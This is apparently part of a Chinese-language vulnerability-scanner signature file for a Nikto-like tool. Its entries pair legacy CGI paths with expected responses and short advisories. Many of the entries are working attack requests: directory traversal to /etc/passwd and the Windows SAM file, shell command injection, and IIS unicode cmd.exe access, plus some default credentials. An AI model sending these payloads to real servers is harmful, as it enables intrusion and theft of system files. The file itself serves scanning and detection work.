+2638#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScartmanager.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2639#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScbmc/forums.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2640#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScgforum.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2641#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSchange-your-password.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2642#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSclickresponder.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2643#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScommandit.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2644#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScounter-ord#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2645#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScounterbanner#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2646#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScounterbanner-ord#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2647#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScounterfiglet-ord#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2648#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScounterfiglet/nc/#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2649#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSCSMailto.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2650#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSCSMailto/CSMailto.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2651#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScsNews.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2652#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScsPassword.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2653#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScsPassword/csPassword.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2654#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScutecast/members/#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2655#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSday5datanotifier.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2656#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSdb2www/library/document.d2w/show#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2657#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSdb_manager.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2658#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSDCFORMS98.CGI#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2659#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSdnewsweb#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2660#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSdonothing#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2661#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSezshopper2/loadpage.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2662#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSezshopper3/loadpage.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2663#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSif/admin/nph-build.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2664#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSikonboard/help.cgi?#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2665#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSimageFolio.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2666#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSimagefolio/admin/admin.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2667#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSjournal.cgi?folder=journal.cgi%00#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2668#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmagiccard.cgi?pa=3Dpreview&amp;next=3Dcustom&amp;page=3D../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2669#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmajordomo.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2670#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSmojo/mojo.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2671#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSncommerce3/ExecMacro/macro.d2w/%0a%0a#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2672#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSncommerce3/ExecMacro/macro.d2w/NOEXISTINGHTMLBLOCK#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2673#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSnon-existent.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2674#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSnph-exploitscanget.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2675#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSnph-maillist.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2676#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSparse-file#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2677#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSphp-cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2678#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSpollssi.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2679#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSpostcards.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2680#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSprofile.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2681#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSquikstore.cfg#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2682#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSregister.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2683#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSreplicator/webpage.cgi/#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2684#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSrightfax/fuwww.dll/?#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2685#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSrmp_query#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2686#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSrobpoll.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2687#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSscripts/*%0a.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2688#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsimplestguest.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2689#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsimplestmail.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2690#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSstatusconfig.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2691#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsws/manager.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2692#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRStexis/phine#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2693#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSUpload.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2694#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSutm/admin#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2695#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSutm/utm_stat#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#通过扫描器可看到web访问日志信息#d9Fa0j#
+2713#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRS.passwd#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#包含授权信息#d9Fa0j#
+2716#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRS.wwwacl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#包含授权信息#d9Fa0j#
+2717#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRS.www_acl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#包含授权信息#d9Fa0j#
+2739#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSls#d9Fa0j#GET#d9Fa0j# neither '/#d9Fa0j#CERN服务器允许攻击者查看主机的路径#d9Fa0j#
+2765#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRStest-cgi.bat#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#这是一个默认值。为赢得Apache 如果低于1.3.23Apache ,这可以被利用在test-cgi.bat ? | dir + c:+ > . . \ htdocs \ listing.txt,但不可能允许资料送回浏览器。#d9Fa0j#
+2964#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/printenv#d9Fa0j#GET#d9Fa0j#Premature end of script headers: /#d9Fa0j#Apache 2.0的printenv默认脚本没有执行权限，但泄漏的文件系统路径。它也可能允许攻击XSS的类型。BID-4431。#d9Fa0j#
+3023#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRScalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22#d9Fa0j#GET#d9Fa0j#uid#d9Fa0j#Vbulletin 允许远程执行命令。参见 http://www.securiteam.com/securitynews/5IP0B203PI.html#d9Fa0j#
+3030#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSimagemap#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#包含来自不同厂商的imagemap.exe文件的多个版本已确认存在缺陷。#d9Fa0j#
+3031#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSimagemap.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#包含来自不同厂商的imagemap.exe文件的多个版本已确认存在缺陷。#d9Fa0j#
+3032#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRShtimage.exe/path/filename?2,2#d9Fa0j#GET#d9Fa0j#tried the following#d9Fa0j#可通过htimage.exe获取Web服务器的物理路径。请参考 BID-964 和 BID-1141。#d9Fa0j#
+3033#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRShtimage.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#htimage.exe在映射名称时可能容易受到缓冲区溢出的漏洞。参考 MS00-028 和 BID-1117。#d9Fa0j#
+3051#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSbbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#PHPNuke 存在远程文件检索漏洞。请尽快升级到最新版本。参考CVE-2001-0320 。#d9Fa0j#
+3053#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSGW5/GWWEB.EXE?GET-CONTEXT&HTMLVER=AAA#d9Fa0j#GET#d9Fa0j#SYS:#d9Fa0j#当某些Netware Web服务器传递CGI参数时，可以轻易获得文件的系统路径。#d9Fa0j#
+3056#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSGW5/GWWEB.EXE?HELP=bad-request#d9Fa0j#GET#d9Fa0j#Could not find file SYS#d9Fa0j#GroupWise允许通过帮助系统来检索系统信息和文件。#d9Fa0j#
+3057#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSGWWEB.EXE?HELP=bad-request#d9Fa0j#GET#d9Fa0j#Could not find file SYS#d9Fa0j#GroupWise允许通过帮助系统来检索系统信息和文件。#d9Fa0j#
+3071#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwebbbs/webbbs_config.pl?name=joe&email=test@example.com&body=aaaaffff&followup=10;cat%20/etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#Darryl Burgdorf 的 WebBBS 很容易收到执行命令漏洞。#d9Fa0j#
+3072#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSvote.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Mike's Vote CGI 加载存在一个bug，允许执行任意命令（版本 1.2）.请参见 http://freshmeat.net/projects/mikessurveycgi/#d9Fa0j#
+3073#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSquizme.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Mike's Quiz Me! CGI加载存在一个bug，允许执行任意命令（版本0.5），请参见 http://freshmeat.net/users/mikespice/#d9Fa0j#
+3080#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsendform.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Rod Clark (v1.4.4 和以下版本)的CGI 可能允许任意文件读取电子邮件或允许发送垃圾邮件。请参考 CVE-2002-0710. BID-5286 。#d9Fa0j#
+3085#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSFileSeek.cgi?head=&foot=;cat%20/etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#FileSeek允许执行任意命令，请登录cgi-perl.com升级到最新版本#d9Fa0j#
+3086#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSFileSeek.cgi?head=;cat%20/etc/passwd|&foot=#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#FileSeek允许执行任意命令，请登录cgi-perl.com升级到最新版本#d9Fa0j#
+3087#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSFileSeek2.cgi?head=&foot=;cat%20/etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#FileSeek允许执行任意命令，请登录cgi-perl.com升级到最新版本#d9Fa0j#
+3088#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSFileSeek2.cgi?head=;cat%20/etc/passwd|&foot=#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#FileSeek允许执行任意命令，请登录cgi-perl.com升级到最新版本#d9Fa0j#
+3089#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSFileSeek.cgi?head=&foot=....//....//....//....//....//....//....//etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#FileSeek允许任意文件检索，请登录cgi-perl.com升级到最新版本#d9Fa0j#
+3090#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSFileSeek.cgi?head=....//....//....//....//....//....//....//etc/passwd&foot=#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#FileSeek允许任意文件检索，请登录cgi-perl.com升级到最新版本#d9Fa0j#
+3091#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSFileSeek2.cgi?head=&foot=....//....//....//....//....//....//....//etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#FileSeek允许任意文件检索，请登录cgi-perl.com升级到最新版本#d9Fa0j#
+3092#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSFileSeek2.cgi?head=....//....//....//....//....//....//....//etc/passwd&foot=#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#FileSeek允许任意文件检索，请登录cgi-perl.com升级到最新版本#d9Fa0j#
+3109#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSdcforum.cgi?az=list&forum=../../../../../../../../../../etc/passwd%00#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#这种DCForum安装方式允许攻击者读取主机上的任意文件。#d9Fa0j#
+3132#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSgettransbitmap#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Sun Answerbook2 存在 gettransbitmap CGI 缓冲区溢出漏洞。所有的默认CGI应被禁用或移除，如果你的Answerbook2不被使用请务必禁用掉。 #d9Fa0j#
+3133#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSguestbook.cgi?user=cpanel&template=|/bin/cat%20/etc/passwd|#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#cpanel的guestbook.cgi允许任意命令行被执行在远程服务器上，请移除 /usr/local/cpanel/cgi-sys/guestbook.cgi 文件或升级到最新版本。#d9Fa0j#
+3145#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSrtm.log#d9Fa0j#GET#d9Fa0j#HttpPost Retry#d9Fa0j#JustAddCommerce富媒体允许检索日志文件，这些日志文件可能存在敏感信息。#d9Fa0j#
+3146#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSVsSetCookie.exe?#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#VsSetCookie.exe文件存在漏洞，可能允许攻击者猜测正确的用户名并访问Lucent系统.#d9Fa0j#
+3152#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSpowerup/r.cgi?FILE=../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#Powerup CGI允许攻击者读取系统上的任意文件。#d9Fa0j#
+3153#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSr.cgi?FILE=../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#Powerup CGI允许攻击者读取系统上的任意文件。#d9Fa0j#
+3154#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSWebnews.exe#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#某些版本的WebNews容易收到缓冲区溢出攻击，请参见 http://www.nextgenss.com/advisories/netwinnews.txt 的更多信息。#d9Fa0j#
+3155#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSwebnews.pl#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#WebNews 在二进制文件中可能存在一些默认用户：testweb/newstest, alwn3845/imaptest, alwi3845/wtest3452, testweb2/wtest4879 。#d9Fa0j#
+3157#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRStexis.exe/junk#d9Fa0j#GET#d9Fa0j#Web Script#d9Fa0j#当无效的文件请求时，Texis网页脚本会获取系统路径/信息。#d9Fa0j#
+3158#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRStexis/junk#d9Fa0j#GET#d9Fa0j#Web Script#d9Fa0j#当无效的文件请求时，Texis网页脚本会获取系统路径/信息。#d9Fa0j#
+3161#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSapexec.pl?etype=odp&template=../../../../../../../../../../etc/passwd%00.html&passurl=/category/#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#这允许攻击者从服务器上读取任意文件。#d9Fa0j#
+3166#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSsensepost.exe?/c+dir#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#sensepost.exe的存在表明该系统是很容易受到攻击,本是一个测试脚本从SensePost。 The sensepost.exe allows command execution (it is a copy of cmd.exe), as did the original unicode exploit (see ht#d9Fa0j#
+3175#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir+c:\#d9Fa0j#GET#d9Fa0j#boot.ini#d9Fa0j# see http://www.wiretrip.net/rfp/p/doc.asp?id=57&face=2 and http://www.securitybugware.org/NT/1422.html. CVE-2000-0884"face=2 和 http://www.securitybugware.org/NT/1422.html ，并参考 CVE-2000-0884 。"#d9Fa0j#
+3198#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSenviron.pl#d9Fa0j#GET#d9Fa0j#REMOTE_ADDR#d9Fa0j#Sambar Server的默认脚本可以获取环境信息。#d9Fa0j#
+3240#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSbb_smilies.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#PHPNUke很容易受到远程文件检索攻击，请升级到最新版本，请参考 CVE-2001-0320 。#d9Fa0j#
+3244#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSustorekeeper.pl?command=goto&file=../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#ustorekeeper将显示任意文件。请参考 CVE-2001-0466 。#d9Fa0j#
+3266#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSa1disp3.cgi?../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此 CGI允许攻击者读取主机上的任意文件。#d9Fa0j#
+3267#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSa1stats/a1disp3.cgi?../../../../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#此 CGI允许攻击者读取主机上的任意文件。#d9Fa0j#
+3268#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSa1stats/a1disp3.cgi?../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#远程文件检索。#d9Fa0j#
+3269#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSa1stats/a1disp4.cgi?../../../../../../../etc/passwd#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#远程文件检索。#d9Fa0j#
+3280#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSnamazu.cgi#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Namazu搜索引擎已发现存在CSS漏洞攻击（确定时间为2001-11-25）.攻击者可以在根目录以外写入任意文件（确定时间为2000-01-26）。#d9Fa0j#
+3283#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRS.nsconfig#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#包含授权信息。#d9Fa0j#
+3288#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1#d9Fa0j#GET#d9Fa0j#Reply from 127.0.0.1#d9Fa0j#可以通过特殊格式的字符串执行命令。请升级到1.15或更高的版本，请参考 CVE-2000-0011 。#d9Fa0j#
+3289#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#可以通过特殊格式的字符串执行命令。请升级到1.15或更高的版本，请参考 CVE-2000-0011 。#d9Fa0j#
+3294#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSshop.pl/page=;cat%20shop.pl|#d9Fa0j#GET#d9Fa0j#\/perl#d9Fa0j#Shopping Cart (Hassan)允许远程执行命令。请参考 CVE-2001-0985 。#d9Fa0j#
+3297#d9Fa0j#MED#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSshopplus.cgi?dn=domainname.com&cartid=%CARTID%&file=;cat%20/etc/passwd|#d9Fa0j#GET#d9Fa0j#root:#d9Fa0j#ShopPlus Cart程序允许执行任意命令。请参考 CVE-2001-0992 。#d9Fa0j#
+3298#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSeshop.pl/seite=;cat%20eshop.pl|#d9Fa0j#GET#d9Fa0j#\/perl#d9Fa0j#此CGI允许攻击者在远程服务器上执行命令。请参考 CVE-2001-1014 。#d9Fa0j#
+3300#d9Fa0j#LOW#d9Fa0j#CGI信息#d9Fa0j#@CGIDIRSion-p.exe?page=c:\winnt\repair\sam#d9Fa0j#GET#d9Fa0j#200#d9Fa0j#Ion-P允许远程文件检索。#d9Fa0j#
